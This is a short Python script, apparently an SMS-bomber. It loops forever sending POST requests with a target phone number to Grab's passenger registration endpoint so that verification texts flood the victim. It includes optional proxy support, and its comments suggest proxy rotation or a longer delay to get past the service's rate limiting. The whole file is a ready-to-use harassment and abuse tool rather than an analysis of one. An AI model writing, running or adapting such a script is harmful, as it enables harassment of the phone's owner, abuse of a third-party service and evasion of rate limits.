# by svinerus
# u can modify this as u want
# for example add proxy pull
# dont forget pip install requests


import requests
from time import sleep


phone = input('enter phone: ')
delay = int(input('delay: '))
proxy = input('proxy or enter for none\n format: http://69.69.69.69:8080')


if not proxy:
    proxy = None
else:
    proxy = {'http': proxy, 'https': proxy}


url = 'https://p.grabtaxi.com/api/passenger/v2/profiles/register'
data = {'phoneNumber': phone, 'countryCode': 'ID', 'name': 'test', 'email': 'mail@mail.com', 'deviceToken': '*'}
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'}


def spam():
    try:
        r = requests.post(url, data=data, headers=headers, proxies=proxy)
    except requests.exceptions.ConnectionError:
        print('ConnectionError thrown!')
    else:
        if r.status_code == 200:
            print('SMS sent!')
        elif r.status_code == 429:
            print('Too many requests! Use proxy or increase delay')
        else:
            print('Something went wrong...', r.status_code, r.reason, r.text)


while True:
    spam()
    sleep(delay)
